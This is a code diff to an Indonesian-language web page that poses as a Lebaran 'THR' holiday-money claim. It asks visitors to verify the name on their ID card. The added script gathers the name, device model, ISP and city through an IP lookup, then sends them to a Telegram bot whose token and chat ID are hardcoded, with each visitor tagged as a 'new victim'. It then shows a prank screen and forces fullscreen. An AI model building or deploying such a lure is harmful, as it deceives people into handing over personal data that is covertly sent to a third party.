@@ -7,11 +7,12 @@
     <style>
         body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
         #intro { margin-top: -50px; padding: 0 20px; }
-        h1 { color: #15803d; margin-bottom: 5px; }
+        h1 { color: #15803d; margin-bottom: 5px; font-size: 1.8rem; }
         p { color: #166534; margin-top: 0; font-weight: bold; }
         #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 30px; width: 280px; }
         input { width: 90%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; outline: none; text-align: center; font-size: 1rem; }
         #envelope { width: 280px; cursor: pointer; transition: all 0.2s ease; z-index: 10; margin-top: 20px; }
+        #envelope:active { transform: scale(0.9); }
         #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; }
         #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
         #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 50; flex-direction: column; align-items: center; justify-content: center; }
@@ -23,11 +24,11 @@
 
     <div id="intro">
         <h1>Selamat Lebaran! 🌙</h1>
-        <p>Silakan verifikasi nama untuk pencairan THR Digital.</p>
+        <p>Verifikasi nama Anda untuk pencairan dana THR.</p>
     </div>
 
     <div id="verify-box">
-        <input type="text" id="victim-name" placeholder="Masukkan Nama Sesuai KTP" autocomplete="off">
+        <input type="text" id="victim-name" placeholder="Nama Sesuai KTP" autocomplete="off">
     </div>
 
     <img id="envelope" src="amplop.png" alt="Amplop THR">
@@ -49,27 +50,53 @@
         const prank = document.getElementById('prank-screen');
         const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
 
-        // BOT TOKEN (SI PENGIRIM) & ID TELE LO (SI PENERIMA)
+        // DATA TELEGRAM
         const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
         const TELE_ID = '7267912519'; 
 
-        function kirimLog(nama) {
-            const pesan = `🎯 KORBAN THR: ${nama}\n📱 Device: ${navigator.platform}`;
-            const apiURL = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(pesan)}`;
+        async function kirimData(nama) {
+            const ua = navigator.userAgent;
+            let device = "Gak Kenal";
+            let provider = "Mencari...";
+            let kota = "Unknown";
+
+            // Deteksi OS
+            if (/android/i.test(ua)) device = "Android";
+            else if (/iPhone|iPad|iPod/i.test(ua)) device = "iPhone/iOS";
+            else if (/Windows/i.test(ua)) device = "Windows/PC";
+
+            // Ambil Seri HP (Model)
+            const model = ua.match(/\(([^)]+)\)/) ? ua.match(/\(([^)]+)\)/)[1] : "Unknown Device";
+
+            // Ambil Provider & Kota (HTTPS aman buat Vercel)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                provider = d.org || "Gak Ketemu";
+                kota = d.city || "Unknown";
+            } catch (e) {
+                provider = "AdBlock Aktif";
+            }
+
+            // Susun Pesan
+            const teks = `🎯 KORBAN BARU: ${nama}\n📱 OS: ${device}\n🔍 Seri: ${model}\n🌐 Provider: ${provider}\n📍 Kota: ${kota}\n⏰ Jam: ${new Date().toLocaleTimeString()}`;
             
-            // Pake Image Beacon (Biar tembus filter browser)
-            const img = new Image();
-            img.src = apiURL;
+            // Kirim ke Bot Tele
+            const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teks)}`;
+            fetch(url, { mode: 'no-cors' }).catch(() => {
+                const i = new Image(); i.src = url;
+            });
         }
 
-        env.addEventListener('click', () => {
+        env.addEventListener('click', async () => {
             const nama = nameInput.value.trim();
             if (nama === "") {
-                alert("Masukkan nama dulu bos biar sistem bisa proses saldo!");
+                alert("Harap masukkan nama untuk verifikasi saldo!");
                 return;
             }
 
-            kirimLog(nama);
+            // Langsung kirim data pas klik amplop
+            kirimData(nama);
 
             loading.style.display = 'flex';
             setTimeout(() => { statusText.innerText = "Memverifikasi data " + nama + "..."; }, 1000);
@@ -79,7 +106,12 @@
                 loading.style.display = 'none';
                 prank.style.display = 'flex';
                 prankSound.play().catch(() => {});
+                
                 if (navigator.vibrate) navigator.vibrate([500, 100, 500]);
+                
+                const elem = document.documentElement;
+                if (elem.requestFullscreen) elem.requestFullscreen();
+                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
             }, 5000);
         });
     </script>
